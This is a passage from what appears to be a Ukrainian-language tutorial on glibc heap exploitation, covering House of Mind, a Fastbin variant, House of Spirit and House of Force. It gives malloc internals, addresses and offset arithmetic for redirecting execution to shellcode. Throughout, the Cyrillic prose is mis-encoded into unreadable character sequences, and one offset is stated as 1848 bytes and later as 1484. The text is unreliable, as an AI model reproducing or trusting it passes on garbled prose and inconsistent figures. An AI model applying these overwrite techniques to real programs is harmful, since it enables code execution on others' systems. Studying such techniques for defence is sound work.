–±–∞—á–∏–ª–∏ —Ä–∞–Ω—ñ—à–µ, —ñ –∑–≤—ñ–¥—Ç–∏ –≤–∏—Ç—è–≥—É—î—Ç—å—Å—è –∑–Ω–∞—á–µ–Ω–Ω—è –ø–µ—Ä—à–∏—Ö 4 –±–∞–π—Ç—ñ–≤, ar\_ptr)

–û—Ç–∂–µ, –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è \_int\_free(ar\_ptr, mem), —Ç–æ–±—Ç–æ **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

–Ø–∫ –º–∏ –±–∞—á–∏–ª–∏ —Ä–∞–Ω—ñ—à–µ, –º–∏ –º–æ–∂–µ–º–æ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è av, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —Ç–µ, —â–æ –º–∏ –∑–∞–ø–∏—Å—É—î–º–æ –≤ —à–º–∞—Ç–æ–∫, —è–∫–∏–π –±—É–¥–µ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π.

–Ø–∫ –≤–∏–∑–Ω–∞—á–µ–Ω–æ unsorted\_chunks, –º–∏ –∑–Ω–∞—î–º–æ, —â–æ:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

–û—Ç–∂–µ, —è–∫—â–æ –º–∏ –∑–∞–ø–∏—Å—É—î–º–æ –∑–Ω–∞—á–µ–Ω–Ω—è \_\_DTOR\_END\_\_-12 –≤ av->bins\[2], —É –æ—Å—Ç–∞–Ω–Ω—ñ–π —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –±—É–¥–µ –∑–∞–ø–∏—Å–∞–Ω–æ –≤ \_\_DTOR\_END\_\_ –∞–¥—Ä–µ—Å—É –¥—Ä—É–≥–æ–≥–æ —à–º–∞—Ç–∫–∞.

–Ü–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –≤ –ø–µ—Ä—à–æ–º—É —à–º–∞—Ç–∫—É –Ω–∞ –ø–æ—á–∞—Ç–∫—É –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –¥–µ–∫—ñ–ª—å–∫–∞ —Ä–∞–∑—ñ–≤ –∑–∞–ø–∏—Å–∞—Ç–∏ –∞–¥—Ä–µ—Å—É \_\_DTOR\_END\_\_-12, –æ—Å–∫—ñ–ª—å–∫–∏ av->bins\[2\] –≤–∏—Ç—è–≥–Ω–µ —ó—ó –∑–≤—ñ–¥—Ç–∏

–í –∞–¥—Ä–µ—Å—ñ, –∫—É–¥–∏ –ø–∞–¥–∞—î –∞–¥—Ä–µ—Å–∞ –¥—Ä—É–≥–æ–≥–æ —à–º–∞—Ç–∫–∞ –∑ –æ—Å—Ç–∞–Ω–Ω—ñ–º–∏ 5 –Ω—É–ª—è–º–∏, –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–ø–∏—Å–∞—Ç–∏ –∞–¥—Ä–µ—Å—É —Ü—å–æ–≥–æ –ø–µ—Ä—à–æ–≥–æ —à–º–∞—Ç–∫–∞, —â–æ–± heap\_for\_ptr() –¥—É–º–∞–≤, —â–æ ar\_ptr –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ –ø–æ—á–∞—Ç–∫—É –ø–µ—Ä—à–æ–≥–æ —à–º–∞—Ç–∫–∞ —ñ –≤–∏—Ç—è–≥—É–≤–∞–≤ –∑–≤—ñ–¥—Ç–∏ av->bins\[2\]

–£ –¥—Ä—É–≥–æ–º—É —à–º–∞—Ç–∫—É, –∑–∞–≤–¥—è–∫–∏ –ø–µ—Ä—à–æ–º—É, –º–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î–º–æ prev\_size –∑—ñ —Å—Ç—Ä–∏–±–∫–æ–º 0x0c —ñ —Ä–æ–∑–º—ñ—Ä–æ–º –∑ —á–∏–º–æ—Å—å –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó -> NON\_MAIN\_ARENA

–ü–æ—Ç—ñ–º —É –¥—Ä—É–≥–æ–º—É —à–º–∞—Ç–∫—É –º–∏ –¥–æ–¥–∞—î–º–æ –∫—É–ø—É nops —ñ, –Ω–∞—Ä–µ—à—Ç—ñ, shellcode

–û—Ç–∂–µ, –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ \_int\_free(TROZO1, TROZO2), —ñ –≤–∏–∫–æ–Ω–∞—î—Ç—å—Å—è —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è –¥–ª—è –∑–∞–ø–∏—Å—É –≤ \_\_DTOR\_END\_\_ –∞–¥—Ä–µ—Å–∏ prev\_size TROZO2, —è–∫–∏–π —Å—Ç—Ä–∏–±–Ω–µ –¥–æ shellcode.

–î–ª—è –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–µ—è–∫—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –≤–∏–º–æ–≥–∏, —è–∫—ñ —É—Å–∫–ª–∞–¥–Ω—é—é—Ç—å –ø–µ–π–ª–æ—É–¥.
–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∂–µ –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è, –æ—Å–∫—ñ–ª—å–∫–∏ –±—É–ª–æ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ –º–∞–π–∂–µ —Ç–æ–π —Å–∞–º–∏–π –ø–∞—Ç—á, —â–æ —ñ –¥–ª—è unlink. –ü–æ—Ä—ñ–≤–Ω—é—é—Ç—å, —á–∏ –Ω–æ–≤–µ –º—ñ—Å—Ü–µ, –Ω–∞ —è–∫–µ –≤–∫–∞–∑—É—î—Ç—å—Å—è, —Ç–∞–∫–æ–∂ –≤–∫–∞–∑—É—î –Ω–∞ –Ω—å–æ–≥–æ.

**Fastbin**

–¶–µ –≤–∞—Ä—ñ–∞–Ω—Ç The house of mind

–Ω–∞—Å —Ü—ñ–∫–∞–≤–∏—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–æ–¥—É, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –ø—ñ—Å–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ñ—É–Ω–∫—Ü—ñ—ó \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> –î–µ fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –≤ "fb" –≤–∫–∞–∑—É—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó –≤ GOT, –Ω–∞ —Ü—é –∞–¥—Ä–µ—Å—É –±—É–¥–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∞–¥—Ä–µ—Å—É –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞. –î–ª—è —Ü—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± –∞—Ä–µ–Ω–∞ –±—É–ª–∞ –±–ª–∏–∑—å–∫–æ—é –¥–æ –∞–¥—Ä–µ—Å dtors. –ö–æ–Ω–∫—Ä–µ—Ç–Ω—ñ—à–µ, av->max\_fast –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤ –∞–¥—Ä–µ—Å—ñ, —è–∫—É –º–∏ –∑–±–∏—Ä–∞—î–º–æ—Å—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏.

–û—Å–∫—ñ–ª—å–∫–∏ –∑ The House of Mind –º–∏ –±–∞—á–∏–ª–∏, —â–æ –º–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î–º–æ –ø–æ–∑–∏—Ü—ñ—é av.

–¢–æ–º—É, —è–∫—â–æ –≤ –ø–æ–ª–µ size –º–∏ –≤—Å—Ç–∞–Ω–æ–≤–∏–º–æ —Ä–æ–∑–º—ñ—Ä 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() –ø–æ–≤–µ—Ä–Ω–µ fastbins\[-1\], —è–∫–∏–π –≤–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –Ω–∞ av->max\_fast

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É av->max\_fast –±—É–¥–µ –∞–¥—Ä–µ—Å–æ—é, —è–∫–∞ –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∞ (–Ω–µ –Ω–∞ —è–∫—É –≤–∫–∞–∑—É—î, –∞ —Å–∞–º–µ —Ü—è –ø–æ–∑–∏—Ü—ñ—è –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∞).

–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± —à–º–∞—Ç–æ–∫ –ø–æ—Ä—É—á –∑ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–º –±—É–≤ –±—ñ–ª—å—à–∏–º –∑–∞ 8 -> –û—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Å–∫–∞–∑–∞–ª–∏, —â–æ —Ä–æ–∑–º—ñ—Ä –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ - 8, —É —Ü—å–æ–º—É —Ñ–∞–ª—å—à–∏–≤–æ–º—É —à–º–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ª–∏—à–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ä–æ–∑–º—ñ—Ä –±—ñ–ª—å—à–µ 8 (–æ—Å–∫—ñ–ª—å–∫–∏ shellcode —Ç–∞–∫–æ–∂ –±—É–¥–µ –≤ —à–º–∞—Ç–∫—É, —è–∫–∏–π –≤–∏–≤—ñ–ª—å–Ω—é—î—Ç—å—Å—è, –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Å–ø–æ—á–∞—Ç–∫—É jmp, —è–∫–∏–π –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ nops).

–ö—Ä—ñ–º —Ç–æ–≥–æ, —Ü–µ–π —Å–∞–º–∏–π —Ñ–∞–ª—å—à–∏–≤–∏–π —à–º–∞—Ç–æ–∫ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –º–µ–Ω—à–∏–º –∑–∞ av->system\_mem. av->system\_mem –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ 1848 –±–∞–π—Ç—ñ–≤ –¥–∞–ª—ñ.

–ß–µ—Ä–µ–∑ –Ω—É–ª—ñ –∑ \_DTOR\_END\_ —Ç–∞ –æ–±–º–µ–∂–µ–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∞–¥—Ä–µ—Å –≤ GOT, –∂–æ–¥–Ω–∞ –∑ —Ü–∏—Ö —Å–µ–∫—Ü—ñ–π –Ω–µ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É, —Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –ø–æ–¥–∏–≤–∏–º–æ—Å—è, —è–∫ –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏ fastbin –¥–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ —Å—Ç–µ–∫.

–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –∞—Ç–∞–∫–∏ - –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ **av** –Ω–∞ —Å—Ç–µ–∫.

–Ø–∫—â–æ –º–∏ –∑–º—ñ–Ω–∏–º–æ —Ä–æ–∑–º—ñ—Ä –Ω–∞ 16 –∑–∞–º—ñ—Å—Ç—å 8, —Ç–æ–¥—ñ: fastbin\_index() –ø–æ–≤–µ—Ä–Ω–µ fastbins\[0\] —ñ –º–∏ –º–æ–∂–µ–º–æ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É —Å—Ç–µ–∫—É.

–î–ª—è —Ü—å–æ–≥–æ –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –∂–æ–¥–Ω–æ–≥–æ canary –∞–±–æ –¥–∏–≤–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω—å –Ω–∞ —Å—Ç–µ—Ü—ñ, —Ñ–∞–∫—Ç–∏—á–Ω–æ –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–Ω–∞–π—Ç–∏—Å—è –≤ —Ç–∞–∫–æ–º—É: 4 –±–∞–π—Ç–∏ –Ω—É–ª—ñ–≤ + EBP + RET

4 –±–∞–π—Ç–∏ –Ω—É–ª—ñ–≤ –ø–æ—Ç—Ä—ñ–±–Ω—ñ, —â–æ–± **av** –±—É–≤ –Ω–∞ —Ü—ñ–π –∞–¥—Ä–µ—Å—ñ, —ñ –ø–µ—Ä—à–∏–π –µ–ª–µ–º–µ–Ω—Ç **av** - —Ü–µ mutex, —è–∫–∏–π –ø–æ–≤–∏–Ω–µ–Ω –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 0.

**av->max\_fast** –±—É–¥–µ EBP —ñ –±—É–¥–µ –∑–Ω–∞—á–µ–Ω–Ω—è–º, —è–∫–µ –¥–æ–∑–≤–æ–ª–∏—Ç—å –Ω–∞–º –æ–±—ñ–π—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è.

–£ **av->fastbins\[0\]** –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ –∞–¥—Ä–µ—Å—É **p** —ñ –±—É–¥–µ RET, —Ç–æ–º—É –≤—ñ–Ω –ø–µ—Ä–µ–π–¥–µ –¥–æ shellcode.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –≤ **av->system\_mem** (1484 –±–∞–π—Ç–∏ –≤–∏—â–µ –≤—ñ–¥ –ø–æ–∑–∏—Ü—ñ—ó –Ω–∞ —Å—Ç–µ—Ü—ñ) –±—É–¥–µ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —Å–º—ñ—Ç—Ç—è, —â–æ –¥–æ–∑–≤–æ–ª–∏—Ç—å –Ω–∞–º –æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± —à–º–∞—Ç–æ–∫ –ø–æ—Ä—É—á –∑ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–º –±—É–≤ –±—ñ–ª—å—à–∏–º –∑–∞ 8 -> –û—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Å–∫–∞–∑–∞–ª–∏, —â–æ —Ä–æ–∑–º—ñ—Ä –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ - 16, —É —Ü—å–æ–º—É —Ñ–∞–ª—å—à–∏–≤–æ–º—É —à–º–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ª–∏—à–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ä–æ–∑–º—ñ—Ä –±—ñ–ª—å—à–µ 8 (–æ—Å–∫—ñ–ª—å–∫–∏ shellcode —Ç–∞–∫–æ–∂ –±—É–¥–µ –≤ —à–º–∞—Ç–∫—É, —è–∫–∏–π –≤–∏–≤—ñ–ª—å–Ω—é—î—Ç—å—Å—è, –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Å–ø–æ—á–∞—Ç–∫—É jmp, —è–∫–∏–π –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ nops, —è–∫—ñ –π–¥—É—Ç—å –ø—ñ—Å–ª—è –ø–æ–ª—è size –Ω–æ–≤–æ–≥–æ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞).

**The House of Spirit**

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ —à—É–∫–∞—î–º–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ malloc, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ —Å—Ç–µ—Ü—ñ –ø—ñ–¥ –º–æ–∂–ª–∏–≤–∏–º –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è–º –∑–º—ñ–Ω–Ω–æ—ó).

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–∏ –º–æ–≥–ª–∏ –± –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –∫—É–¥–∏ –∑–∞–≤–≥–æ–¥–Ω–æ. –û–¥–Ω–∞–∫ –Ω–µ –±—É–¥—å-—è–∫–µ –º—ñ—Å—Ü–µ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å, —Ä–æ–∑–º—ñ—Ä —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –º–µ–Ω—à–∏–º –∑–∞ av->max\_fast —ñ, –±—ñ–ª—å—à –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ, –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ —Ä–æ–∑–º—ñ—Ä—É, –∑–∞–ø–∏—Ç–∞–Ω–æ–º—É —É –º–∞–π–±—É—Ç–Ω—å–æ–º—É –≤–∏–∫–ª–∏–∫—É malloc()+8. –¢–æ–º—É, —è–∫—â–æ –º–∏ –∑–Ω–∞—î–º–æ, —â–æ –ø—ñ—Å–ª—è —Ü—å–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∞ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è malloc(40), —Ä–æ–∑–º—ñ—Ä —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ –ø–æ–≤–∏–Ω–µ–Ω –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 48.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ –∑–∞–ø–∏—Ç—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—Ä–æ —á–∏—Å–ª–æ, –º–∏ –º–æ–∂–µ–º–æ –≤–≤–µ—Å—Ç–∏ 48 —ñ –≤–∫–∞–∑–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ malloc –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ 4 –±–∞–π—Ç–∏ (—è–∫—ñ –º–æ–∂—É—Ç—å –Ω–∞–ª–µ–∂–∞—Ç–∏ EBP, –∑ —É–¥–∞—á–µ—é, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, 48 –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –ø–æ–∑–∞–¥—É, —è–∫—â–æ —Ü–µ –±—É–¥–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ size). –ö—Ä—ñ–º —Ç–æ–≥–æ, –∞–¥—Ä–µ—Å–∞ ptr-4+48 –ø–æ–≤–∏–Ω–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –¥–µ–∫—ñ–ª—å–∫–æ–º —É–º–æ–≤–∞–º (—É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É ptr=EBP), —Ç–æ–±—Ç–æ 8 < ptr-4+48 < av->system\_mem.

–Ø–∫—â–æ —Ü–µ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è, –∫–æ–ª–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–π malloc, —è–∫–∏–π –º–∏ —Å–∫–∞–∑–∞–ª–∏, —â–æ —Ü–µ malloc(40), –π–æ–º—É –±—É–¥–µ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ –∞–¥—Ä–µ—Å—É EBP. –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ —Ç–∞–∫–æ–∂ –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —Ç–µ, —â–æ –∑–∞–ø–∏—Å—É—î—Ç—å—Å—è –≤ —Ü–µ–π malloc, –≤—ñ–Ω –º–æ–∂–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —è–∫ EBP, —Ç–∞–∫ —ñ EIP –±—É–¥—å-—è–∫–æ—é –∞–¥—Ä–µ—Å–æ—é, —è–∫—É –≤—ñ–Ω —Ö–æ—á–µ.

–¶–µ, –º–∞–±—É—Ç—å, —Ç–æ–º—É, —â–æ –∫–æ–ª–∏ free() –≤–∏–≤—ñ–ª—å–Ω—è—î, –≤—ñ–Ω –∑–±–µ—Ä—ñ–≥–∞—î, —â–æ –≤ –∞–¥—Ä–µ—Å—ñ, —è–∫–∞ –≤–∫–∞–∑—É—î –Ω–∞ EBP —Å—Ç–µ–∫—É, —î —à–º–∞—Ç–æ–∫ —ñ–¥–µ–∞–ª—å–Ω–æ–≥–æ —Ä–æ–∑–º—ñ—Ä—É –¥–ª—è –Ω–æ–≤–æ–≥–æ malloc(), —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ —Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏, —Ç–æ–º—É –≤—ñ–Ω –ø—Ä–∏–∑–Ω–∞—á–∞—î —Ü—é –∞–¥—Ä–µ—Å—É.

**The House of Force**

–ü–æ—Ç—Ä—ñ–±–Ω–æ:

* –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —à–º–∞—Ç–∫–∞, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ wilderness
* –í–∏–∫–ª–∏–∫ malloc() —ñ–∑ —Ä–æ–∑–º—ñ—Ä–æ–º, –≤–∏–∑–Ω–∞—á–µ–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º
* –í–∏–∫–ª–∏–∫ malloc(), –¥–∞–Ω—ñ —è–∫–æ–≥–æ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∑–Ω–∞—á–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º

–°–ø–æ—á–∞—Ç–∫—É —Ä–æ–∑–º—ñ—Ä —à–º–∞—Ç–∫–∞ wilderness –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î—Ç—å—Å—è –∑–Ω–∞—á–µ–Ω–Ω—è–º –¥—É–∂–µ –≤–µ–ª–∏–∫–∏–º (0xffffffff), —Ç–æ–º—É –±—É–¥—å-—è–∫–µ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –≤–µ–ª–∏–∫–µ –ø—Ä–æ—Ö–∞–Ω–Ω—è –ø—Ä–æ –ø–∞–º'—è—Ç—å –±—É–¥–µ –æ–±—Ä–æ–±–ª–µ–Ω–æ –≤ \_int\_malloc() –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –∫—É–ø–∏

–î—Ä—É–≥–µ - –∑–º—ñ–Ω–∏—Ç–∏ av->top, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º'—è—Ç—ñ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, —Ç–∞–∫—É —è–∫ —Å—Ç–µ–∫. –£ av->top –±—É–¥–µ \&EIP - 8.

–ú–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ av->top, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º'—è—Ç—ñ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim –æ—Ç—Ä–∏–º—É—î –∑–Ω–∞—á–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ –ø–æ—Ç–æ—á–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ wilderness (–ø–æ—Ç–æ—á–Ω–∏–π av->top), –∞ remainder - —Ü–µ —Å–∞–º–µ —Å—É–º–∞ —Ü—ñ—î—ó –∞–¥—Ä–µ—Å–∏ –ø–ª—é—Å –∫—ñ–ª—å–∫—ñ—Å—Ç—å –±–∞–π—Ç—ñ–≤, –∑–∞–ø–∏—Ç–∞–Ω–∏—Ö malloc(). –¢–æ–º—É, —è–∫—â–æ \&EIP-8 –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é 0xbffff224, –∞ av->top –º—ñ—Å—Ç–∏—Ç—å 0x080c2788, —Ç–æ–¥—ñ –∫—ñ–ª—å–∫—ñ—Å—Ç—å, —è–∫—É –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏ –≤ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–º—É malloc, —â–æ–± av->top –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ $EIP-8 –¥–ª—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ malloc(), –±—É–¥–µ:

0xbffff224 - 0x080c2788 = 3086207644.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–º—ñ–Ω–µ–Ω–∏–π –∑–Ω–∞—á–µ–Ω–Ω—è –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–æ –≤ av->top, —ñ –Ω–∞—Å—Ç—É–ø–Ω–∏–π malloc –≤–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –Ω–∞ EIP —ñ –º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∏–π.

–í–∞–∂–ª–∏–≤–æ –∑–Ω–∞—Ç–∏, —â–æ —Ä–æ–∑–º—ñ—Ä –Ω–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ wilderness –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –±—ñ–ª—å—à–∏–º –∑–∞ –∑–∞–ø–∏—Ç, –∑—Ä–æ–±–ª–µ–Ω–∏–π –æ—Å—Ç–∞–Ω–Ω—ñ–º malloc(). –Ü–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, —è–∫—â–æ wilderness –≤–∫–∞–∑—É—î –Ω–∞ \&EIP-8, —Ä–æ–∑–º—ñ—Ä –±—É–¥–µ —Ç–æ—á–Ω–æ –≤ –ø–æ–ª—ñ EBP —Å—Ç–µ–∫—É.

**The House of Lore**

**–ö–æ—Ä—É–ø—Ü—ñ—è SmallBin**

